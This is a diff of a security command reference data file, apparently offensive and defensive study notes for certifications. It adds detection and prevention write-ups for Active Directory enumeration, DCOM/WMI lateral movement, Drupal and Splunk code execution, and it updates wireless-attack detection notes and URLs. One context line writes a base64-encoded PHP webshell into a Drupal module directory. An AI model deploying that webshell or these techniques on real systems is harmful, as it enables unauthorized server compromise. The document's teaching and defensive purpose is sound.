@@ -27,7 +27,7 @@ const COMMAND_DATA = {
         "wireless"
       ],
       "mitre": [
-        "T1465",
+        "T1557",
         "T1040"
       ],
       "notes": "=== PREREQUISITES: MONITOR MODE ===\n# List wireless interfaces\niwconfig\n\n# Enable monitor mode via airmon-ng (kills interfering processes)\nsudo airmon-ng start wlan0\n  → Creates wlan0mon interface in monitor mode\n\n# Enable monitor mode manually\nsudo ifconfig wlan0 down\nsudo iwconfig wlan0 mode monitor\nsudo ifconfig wlan0 up\n\n# Verify monitor mode\niwconfig wlan0mon   # or 'iwconfig wlan0' if not renamed\n  → Should show: Mode:Monitor\n\n=== CAPTURING WIRELESS TRAFFIC ===\n# Capture on specific AP channel and BSSID\nsudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> wlan0 -w raw\n  → Example: sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw\n  → Outputs: raw-01.cap (capture), raw-01.csv (data), etc.\n\n# Detect evil-twin by ESSID (shows all APs with same name)\nsudo airodump-ng -c 4 --essid <SSID_NAME> wlan0 -w raw\n  → Two rows with same ESSID but different BSSID/ENC = evil-twin\n\n=== DEAUTHENTICATION ATTACK DETECTION ===\nHow it works:\n  → Attacker crafts 802.11 mgmt frame with BSSID of legitimate AP\n  → Frame type: Deauthentication (type=0, subtype=12)\n  → Client cannot distinguish from real deauth without 802.11w\n  → Tools: aireplay-ng, mdk4 (default reason code: 7)\n\nWireshark filters:\n# Filter to AP's BSSID only\nwlan.bssid == <AP_BSSID>\n\n# All deauthentication frames from AP's BSSID\n(wlan.bssid == <AP_BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)\n\n# Deauth frames with reason code 7 (aireplay-ng/mdk4 default)\n(wlan.bssid == <AP_BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)\n\n# Detect revolving reason codes (sophisticated attacker)\n→ Check reason codes 1, 2, 3 sequentially:\n(wlan.bssid == <AP_BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)\n(wlan.bssid == <AP_BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)\n  → If sequential codes appear = script rotating codes to evade WIDS\n\nDeauth IOCs:\n  → Excessive deauth frames sent to a single client MAC\n  → Reason code 7 from AP's BSSID = common tool default\n  → Rotating reason codes (1→2→3...) = sophisticated evasion\n  → Client repeatedly disconnecting and reconnecting\n\n=== FAILED AUTHENTICATION DETECTION ===\n# Filter for association/authentication frames\n(wlan.bssid == <AP_BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)\n  → type_subtype 0 = Association Request\n  → type_subtype 1 = Association Response\n  → type_subtype 11 = Authentication\n\n=== EVIL-TWIN / ROGUE AP DETECTION ===\nEvil-twin vs Rogue AP:\n  → Evil-twin: NOT on network — standalone AP impersonating legitimate SSID\n    Purpose: hostile portal (harvest creds), credential capture, MITM\n  → Rogue AP: IS connected to network — hotspot or tethered device\n    Purpose: bypass network controls, segmentation bypass\n\nDetection with airodump-ng:\n  sudo airodump-ng -c <CHANNEL> --essid <SSID_NAME> wlan0 -w raw\n  → Legitimate AP: ENC=WPA2, CIPHER=CCMP, AUTH=PSK\n  → Evil-twin: ENC=OPN (open) — no RSN information element\n\nDetection with Wireshark beacon analysis:\n# Filter for beacon frames\n(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)\n  → Open Packet Details → check RSN (Robust Security Network) info\n  → Legitimate: RSN present with cipher suites (AES, TKIP, PSK)\n  → Evil-twin: RSN absent or mismatched ciphers\n\n# Filter to only evil-twin BSSID\n(wlan.bssid == <EVIL_TWIN_BSSID>)\n  → Look for client ARP requests — a connected victim shows ARP to DHCP\n\nRSN field differences (expanded in Packet Details pane):\n  → Legitimate: RSN Information → Cipher Suites: TKIP, CCMP; Auth: PSK\n  → Evil-twin (open): No RSN Information element in beacon frame\n  → Check vendor-specific information elements — likely absent from attacker's AP\n\nResponse steps:\n  1. Record victim's MAC address and hostname from ARP traffic\n  2. Initiate password reset for potentially compromised credentials\n  3. Locate rogue AP via signal strength + physical search\n  4. Disable attacker-controlled AP at switch level if connected\n\n=== 802.11 FRAME TYPE REFERENCE ===\nwlan.fc.type values:\n  00 = Management frames (deauth, beacons, probe, auth, assoc)\n  01 = Control frames (ACK, RTS, CTS)\n  02 = Data frames\n\nwlan.fc.type_subtype values (management):\n  0  = Association Request\n  1  = Association Response\n  8  = Beacon\n  11 = Authentication\n  12 = Deauthentication\n  12 = Disassociation\n\n=== PREVENTION ===\n  → Enable IEEE 802.11w (Management Frame Protection) — cryptographically signs mgmt frames\n  → Utilize WPA3-SAE — stronger auth, harder to crack captured handshakes\n  → WIDS/WIPS: detect deauth floods, rogue APs, evil-twins automatically\n  → Modify WIDS rules to detect rotating reason codes",
@@ -79,8 +79,8 @@ const COMMAND_DATA = {
           "url": "https://en.wikipedia.org/wiki/IEEE_802.11w-2009"
         },
         {
-          "title": "MITRE ATT&CK - Rogue Wi-Fi Access Points (T1465)",
-          "url": "https://attack.mitre.org/techniques/T1465/"
+          "title": "MITRE ATT&CK - Adversary-in-the-Middle (T1557)",
+          "url": "https://attack.mitre.org/techniques/T1557/"
         }
       ],
       "recommended": [
@@ -1621,7 +1621,18 @@ const COMMAND_DATA = {
         "T1087.002",
         "T1069.002"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "defense": {
+        "why_it_works": "Any authenticated domain user can bind to the directory over LDAP and read objects; the .NET DirectoryServices/ADSI classes are built into Windows, so enumeration needs no external tools and evades tool-signature detection. LDAP read is a designed feature available to all authenticated principals.",
+        "prerequisites": "Any authenticated domain-user context; LDAP (389/636) reachable to a DC; PowerShell/.NET (present by default on Windows).",
+        "impact": "T1087.002 Account Discovery: Domain Account + T1069.002 Permission Groups Discovery: Domain Groups — maps users, groups, computers and attributes for privilege-escalation path planning.",
+        "detection": "Microsoft Defender for Identity LDAP-reconnaissance alerts on bulk/anomalous queries from a workstation. Event 1644 (when LDAP query logging is enabled). PowerShell Script Block Logging (4104): DirectorySearcher/DirectoryEntry/adsi usage. Baseline-deviating native ADSI enumeration from user endpoints.",
+        "prevention": "Cannot be fully prevented (LDAP read is by design). Deploy MDI to detect recon; apply least privilege on sensitive object attributes; baseline and alert on LDAP query volume; enable ADSI/PowerShell logging.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1087/002/",
+          "https://attack.mitre.org/techniques/T1069/002/"
+        ]
+      }
     },
     {
       "id": "ad-dcom-exec",
@@ -1717,7 +1728,17 @@ const COMMAND_DATA = {
       "mitre": [
         "T1021.003"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "defense": {
+        "why_it_works": "DCOM lets a client instantiate COM objects on a remote host over RPC (endpoint mapper 135 + dynamic ports). Objects like MMC20.Application expose methods (Document.ActiveView.ExecuteShellCommand) that spawn processes, so with local admin on the target an attacker instantiates the object remotely and calls that method to run code — using a signed, trusted DCOM path with nothing dropped to disk.",
+        "prerequisites": "Local admin on the target; RPC/DCOM reachable (135 + dynamic high ports); the DCOM object's launch/access permissions allow the calling user.",
+        "impact": "T1021.003 Remote Services: Distributed Component Object Model — remote code execution / lateral movement in the security context of the DCOM activation.",
+        "detection": "Sysmon Event 1 / Event 4688: mmc.exe (or the DCOM server) spawning cmd.exe/powershell.exe with a network-logon parent. Event 4624 Type 3 immediately preceding process creation. DistributedCOM operational events (10028/10036). Anomalous RPC to 135 + ephemeral ports between workstations.",
+        "prevention": "Restrict DCOM launch/activation permissions (dcomcnfg). Minimise local-admin sprawl. Host firewall to block inbound RPC/DCOM between workstations. Network segmentation and monitoring of lateral RPC.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1021/003/"
+        ]
+      }
     },
     {
       "id": "ad-wmi-cim-exec",
@@ -1819,7 +1840,18 @@ const COMMAND_DATA = {
         "T1047",
         "T1021.006"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "defense": {
+        "why_it_works": "WMI (wmic /node, or PowerShell CIM over DCOM) and WinRS (over WinRM 5985/5986) are built-in remote-management channels. With admin credentials, Win32_Process.Create spawns arbitrary processes on the remote host and WinRS opens a remote shell. Both are signed, legitimate admin tooling (living-off-the-land), so the activity blends with normal management traffic.",
+        "prerequisites": "Valid credentials with local admin on target; WMI/DCOM (135 + dynamic) or WinRM (5985/5986) reachable; for CIM-over-WinRM the WinRM service enabled.",
+        "impact": "T1047 Windows Management Instrumentation + T1021.006 Remote Services: Windows Remote Management — remote code execution / lateral movement as the supplied account.",
+        "detection": "Event 4688 / Sysmon 1: WmiPrvSE.exe spawning cmd/powershell (WMI process-create) or wsmprovhost.exe children (WinRM). Event 4624 Type 3 logon preceding. Microsoft-Windows-WMI-Activity/Operational. WinRM: Event 4103/4104 and HTTP to 5985/5986. Network: RPC 135 + ephemeral, or 5985/5986 between endpoints.",
+        "prevention": "Restrict local admin; limit remote WMI/WinRM use (WinRM TrustedHosts, GPO, JEA for constrained endpoints). Host firewall for 135/5985. Segment management traffic.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1047/",
+          "https://attack.mitre.org/techniques/T1021/006/"
+        ]
+      }
     },
     {
       "id": "crtp-ad-module-enum",
@@ -17478,7 +17510,18 @@ const COMMAND_DATA = {
           "label": "Create webshell via base64 decode (alternative to embedding in module)",
           "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php"
         }
-      ]
+      ],
+      "defense": {
+        "why_it_works": "An admin with the 'administer modules' permission can install arbitrary module archives, and Drupal executes module PHP. Bundling a webshell plus a .htaccess that re-enables PHP execution in the module directory yields RCE. The platform trusts uploaded module code by design, so an admin-level compromise becomes server code execution.",
+        "prerequisites": "Drupal admin session with module-install permission (or a compromised admin account); ability to upload/point to a module archive; the web server executes PHP under the module directory.",
+        "impact": "T1190 Exploit Public-Facing Application + T1505.003 Server Software Component: Web Shell — persistent RCE as the web-server user.",
+        "detection": "New .php (webshell) and .htaccess written under modules/ (file-integrity monitoring / Sysmon 11). Web logs: requests to an unexpected module path returning command output. Drupal watchdog: module install events. Outbound connections from the web-server process.",
+        "prevention": "Restrict 'administer modules' to trusted admins; disable UI module installation in production ($settings['allow_authorize_operations']=FALSE); enforce signed/reviewed modules; make the web root read-only to the runtime user; WAF on /admin.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1190/",
+          "https://attack.mitre.org/techniques/T1505/003/"
+        ]
+      }
     },
     {
       "type": "command",
@@ -34171,7 +34214,7 @@ const COMMAND_DATA = {
       "references": [
         {
           "title": "PortSwigger - LDAP Injection",
-          "url": "https://portswigger.net/web-security/ldap-injection"
+          "url": "https://owasp.org/www-community/attacks/LDAP_Injection"
         },
         {
           "title": "HTB Academy - Attacking Common Applications",
@@ -49491,7 +49534,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "SANS - Network Forensics & Traffic Analysis",
-          "url": "https://www.sans.org/white-papers/network-forensics-traffic-analysis/"
+          "url": "https://www.sans.org/white-papers/"
         },
         {
           "title": "Wireshark Statistics Documentation",
@@ -52412,7 +52455,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "Microsoft - Enable EPA on IIS for ADCS",
-          "url": "https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910b468b0"
+          "url": "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/"
         }
       ],
       "recommended": [
@@ -55171,7 +55214,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "Targeted Kerberoasting (harmj0y)",
-          "url": "https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/"
+          "url": "https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"
         },
         {
           "title": "HTB Academy - Active Directory Enumeration & Attacks",
@@ -65507,7 +65550,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "BloodHound Data Collection Methods",
-          "url": "https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html"
+          "url": "https://bloodhound.specterops.io/"
         },
         {
           "title": "HTB Academy - Active Directory Enumeration & Attacks",
@@ -69299,7 +69342,18 @@ const COMMAND_DATA = {
         "T1190",
         "T1059.001"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "defense": {
+        "why_it_works": "Splunk executes scripted inputs (scripts/ + inputs.conf) from installed apps under the Splunk service account. A user who can install apps can package one whose inputs.conf runs an attacker script on an interval, giving RCE. Splunk trusts app-supplied scripts by design.",
+        "prerequisites": "Splunk web/admin access with capability to install apps (or forwarder-bundle push); scripted inputs enabled (default); network egress for the reverse shell.",
+        "impact": "T1190 Exploit Public-Facing Application + T1059.001 Command and Scripting Interpreter: PowerShell (or Python) — RCE as the Splunk user, often SYSTEM/root on the indexer or forwarder.",
+        "detection": "splunkd spawning cmd/powershell/python (Sysmon 1 / Event 4688). New app directory under etc/apps with scripts/ and inputs.conf. Splunk _internal logs: app install + scripted-input registration. Outbound from splunkd to an unusual host.",
+        "prevention": "Restrict the install_apps / admin_all_objects capabilities; disable scripted inputs where unused; run Splunk as a low-privilege service account; app allowlist/vetting; segment and monitor Splunk egress.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1190/",
+          "https://attack.mitre.org/techniques/T1059/001/"
+        ]
+      }
     },
     {
       "id": "sql-enumerate",
@@ -77422,7 +77476,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "SID History Attack (harmj0y)",
-          "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-ntdsdit-oh-my/"
+          "url": "https://adsecurity.org/?p=1729"
         },
         {
           "title": "HTB Academy - Active Directory Enumeration & Attacks",
@@ -88015,7 +88069,7 @@ const COMMAND_DATA = {
       "references": [
         {
           "title": "OWASP XSLT Injection",
-          "url": "https://owasp.org/www-community/attacks/XSLT_Injection"
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html"
         },
         {
           "title": "HTB Academy - Server-side Attacks",
@@ -90381,7 +90435,7 @@ const COMMAND_DATA = {
       "mitre": [
         "T1040"
       ],
-      "notes": "=== ZEEK OVERVIEW ===\nZeek is NOT a signature-based IDS — it's a semantic analysis platform:\n  → Semantic misuse detection\n  → Anomaly detection\n  → Behavioral analysis\n  → Full application-layer protocol decoding\n  → Generates structured TSV logs for all observed traffic\n\nZeek analyzes application-layer protocols regardless of port number.\n\n=== OPERATION MODES ===\n  Fully passive traffic analysis\n  libpcap interface for packet capture\n  Real-time and offline (PCAP-based) analysis\n  Cluster support for large-scale deployments\n\n=== ARCHITECTURE ===\n1. Event Engine (Core):\n   → Converts raw packet stream into high-level events\n   → Events are policy-neutral (describe WHAT happened, not if it's bad)\n   → Example: HTTP request → http_request event (all details, no judgment)\n   → Events queued and processed first-come, first-served\n   → Most events defined in .bif files at:\n     /scripts/base/bif/plugins/\n   → Event reference: https://docs.zeek.org/en/stable/scripts/base/bif/\n\n2. Script Interpreter:\n   → Executes Zeek scripts (event handlers written in Zeek's scripting language)\n   → Scripts express the 'site security policy'\n   → Scripts define what to DO when certain events are detected\n   → Similar in concept to Suricata rules but much more powerful (Turing complete)\n\n=== RUNNING ZEEK ===\nOffline PCAP analysis:\n  /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/suspicious.pcap\n    → -C: ignore checksum errors\n    → -r: read from PCAP file\n    → Logs written to current directory\n\nLive analysis:\n  /usr/local/zeek/bin/zeek -i ens160\n    → Live capture on interface\n\nDownload PCAP from target for local analysis:\n  scp htb-student@<TARGET_IP>:/home/htb-student/pcaps/psempire.pcap .\n\n=== KEY LOG FILES ===\nconn.log:\n  → All IP/TCP/UDP/ICMP connections\n  → Fields: ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p,\n             proto, service, duration, orig_bytes, resp_bytes, conn_state,\n             history, orig_pkts, orig_ip_bytes, resp_pkts, resp_ip_bytes\n  → Use for: traffic volume analysis, beaconing detection, connection patterns\n\ndns.log:\n  → All DNS queries and responses\n  → Fields: ts, uid, id.orig_h, id.resp_h, query, qtype, qtype_name,\n             rcode, rcode_name, answers, TTLs\n  → Use for: DNS enumeration, tunneling, DGA detection\n\nhttp.log:\n  → HTTP requests and responses\n  → Fields: host (domain/IP), uri, referrer, user_agent, status_code\n  → Use for: web activity, C2 beaconing, file downloads\n\nftp.log:\n  → FTP requests and responses\n\nsmtp.log:\n  → SMTP transactions (sender, recipient, subject)\n\nsmb_files.log:\n  → SMB file operations (open, write, delete)\n  → Key for PsExec detection (PSEXESVC.exe on ADMIN$)\n\ndce_rpc.log:\n  → DCE/RPC calls over named pipes\n  → Key for PsExec (svcctl: CreateServiceW, StartServiceW, DeleteService)\n\nsmb_mapping.log:\n  → SMB share mappings (\\\\host\\ADMIN$, \\\\host\\IPC$)\n\nfiles.log:\n  → Files extracted from network traffic\n\nssl.log:\n  → TLS/SSL session metadata\n\n=== ZEEK-CUT UTILITY ===\nzeek-cut: extracts specific columns from Zeek TSV logs\n  → Reads from stdin (pipe logs into it)\n  → Outputs only specified column(s)\n\nSyntax:\n  cat conn.log | /usr/local/zeek/bin/zeek-cut <field1> <field2> ...\n\nExamples:\n  # Extract query field from dns.log:\n  cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7\n\n  # Sum bytes per src/dst pair (TLS exfil detection):\n  cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes \\\n    | sort | grep -v -e '^$' | grep -v '-' \\\n    | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10\n    → datamash -g 1,2: group by columns 1+2 (src+dst IPs)\n    → sum 3: sum column 3 (orig_bytes)\n    → sort -k 3 -rn: sort by bytes descending\n    → Reveals top talkers / exfil destinations\n\n=== LOG COMPRESSION ===\nZeek compresses logs hourly by default:\n  → Older logs: gzip compressed\n  → Moved to YYYY-MM-DD/ directory\n\nWorking with compressed logs:\n  gzcat log.gz          → print gzipped log\n  zgrep 'pattern' *.gz  → search within gzipped logs\n\nReference: https://blog.rapid7.com/2016/06/02/working-with-bro-logs-queries-by-example/\n\n=== CONN_STATE VALUES ===\nSF  → normal established + closed connection\nS0  → connection attempt seen, no reply\nS1  → connection established, not closed\nRST → connection reset\nREJ → connection rejected\n\n=== ZEEK KEY FEATURES ===\n  Comprehensive logging of all network activity\n  Application-layer protocol analysis (regardless of port)\n  File content inspection across protocols\n  IPv6 support\n  Tunnel detection and analysis\n  Protocol sanity checking\n  IDS-like pattern matching\n  Powerful domain-aware scripting language\n  Outputs structured ASCII TSV logs (or ElasticSearch/DataSeries)\n  Real-time external input integration\n  External C library for sharing events with other programs",
+      "notes": "=== ZEEK OVERVIEW ===\nZeek is NOT a signature-based IDS — it's a semantic analysis platform:\n  → Semantic misuse detection\n  → Anomaly detection\n  → Behavioral analysis\n  → Full application-layer protocol decoding\n  → Generates structured TSV logs for all observed traffic\n\nZeek analyzes application-layer protocols regardless of port number.\n\n=== OPERATION MODES ===\n  Fully passive traffic analysis\n  libpcap interface for packet capture\n  Real-time and offline (PCAP-based) analysis\n  Cluster support for large-scale deployments\n\n=== ARCHITECTURE ===\n1. Event Engine (Core):\n   → Converts raw packet stream into high-level events\n   → Events are policy-neutral (describe WHAT happened, not if it's bad)\n   → Example: HTTP request → http_request event (all details, no judgment)\n   → Events queued and processed first-come, first-served\n   → Most events defined in .bif files at:\n     /scripts/base/bif/plugins/\n   → Event reference: https://docs.zeek.org/en/stable/scripts/base/bif/\n\n2. Script Interpreter:\n   → Executes Zeek scripts (event handlers written in Zeek's scripting language)\n   → Scripts express the 'site security policy'\n   → Scripts define what to DO when certain events are detected\n   → Similar in concept to Suricata rules but much more powerful (Turing complete)\n\n=== RUNNING ZEEK ===\nOffline PCAP analysis:\n  /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/suspicious.pcap\n    → -C: ignore checksum errors\n    → -r: read from PCAP file\n    → Logs written to current directory\n\nLive analysis:\n  /usr/local/zeek/bin/zeek -i ens160\n    → Live capture on interface\n\nDownload PCAP from target for local analysis:\n  scp htb-student@<TARGET_IP>:/home/htb-student/pcaps/psempire.pcap .\n\n=== KEY LOG FILES ===\nconn.log:\n  → All IP/TCP/UDP/ICMP connections\n  → Fields: ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p,\n             proto, service, duration, orig_bytes, resp_bytes, conn_state,\n             history, orig_pkts, orig_ip_bytes, resp_pkts, resp_ip_bytes\n  → Use for: traffic volume analysis, beaconing detection, connection patterns\n\ndns.log:\n  → All DNS queries and responses\n  → Fields: ts, uid, id.orig_h, id.resp_h, query, qtype, qtype_name,\n             rcode, rcode_name, answers, TTLs\n  → Use for: DNS enumeration, tunneling, DGA detection\n\nhttp.log:\n  → HTTP requests and responses\n  → Fields: host (domain/IP), uri, referrer, user_agent, status_code\n  → Use for: web activity, C2 beaconing, file downloads\n\nftp.log:\n  → FTP requests and responses\n\nsmtp.log:\n  → SMTP transactions (sender, recipient, subject)\n\nsmb_files.log:\n  → SMB file operations (open, write, delete)\n  → Key for PsExec detection (PSEXESVC.exe on ADMIN$)\n\ndce_rpc.log:\n  → DCE/RPC calls over named pipes\n  → Key for PsExec (svcctl: CreateServiceW, StartServiceW, DeleteService)\n\nsmb_mapping.log:\n  → SMB share mappings (\\\\host\\ADMIN$, \\\\host\\IPC$)\n\nfiles.log:\n  → Files extracted from network traffic\n\nssl.log:\n  → TLS/SSL session metadata\n\n=== ZEEK-CUT UTILITY ===\nzeek-cut: extracts specific columns from Zeek TSV logs\n  → Reads from stdin (pipe logs into it)\n  → Outputs only specified column(s)\n\nSyntax:\n  cat conn.log | /usr/local/zeek/bin/zeek-cut <field1> <field2> ...\n\nExamples:\n  # Extract query field from dns.log:\n  cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7\n\n  # Sum bytes per src/dst pair (TLS exfil detection):\n  cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes \\\n    | sort | grep -v -e '^$' | grep -v '-' \\\n    | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10\n    → datamash -g 1,2: group by columns 1+2 (src+dst IPs)\n    → sum 3: sum column 3 (orig_bytes)\n    → sort -k 3 -rn: sort by bytes descending\n    → Reveals top talkers / exfil destinations\n\n=== LOG COMPRESSION ===\nZeek compresses logs hourly by default:\n  → Older logs: gzip compressed\n  → Moved to YYYY-MM-DD/ directory\n\nWorking with compressed logs:\n  gzcat log.gz          → print gzipped log\n  zgrep 'pattern' *.gz  → search within gzipped logs\n\nReference: https://docs.zeek.org/en/master/logs/index.html\n\n=== CONN_STATE VALUES ===\nSF  → normal established + closed connection\nS0  → connection attempt seen, no reply\nS1  → connection established, not closed\nRST → connection reset\nREJ → connection rejected\n\n=== ZEEK KEY FEATURES ===\n  Comprehensive logging of all network activity\n  Application-layer protocol analysis (regardless of port)\n  File content inspection across protocols\n  IPv6 support\n  Tunnel detection and analysis\n  Protocol sanity checking\n  IDS-like pattern matching\n  Powerful domain-aware scripting language\n  Outputs structured ASCII TSV logs (or ElasticSearch/DataSeries)\n  Real-time external input integration\n  External C library for sharing events with other programs",
       "examples": [
         {
           "label": "Analyze PCAP with Zeek (ignore checksums)",
@@ -90439,7 +90493,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "Working with Zeek Logs",
-          "url": "https://blog.rapid7.com/2016/06/02/working-with-bro-logs-queries-by-example/"
+          "url": "https://docs.zeek.org/en/master/logs/index.html"
         }
       ],
       "recommended": [
@@ -90574,7 +90628,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-02T12:44:24.043Z",
+  "buildDate": "2026-09-02T14:27:14.837Z",
   "certifications": [
     "CDSA",
     "CPTS",
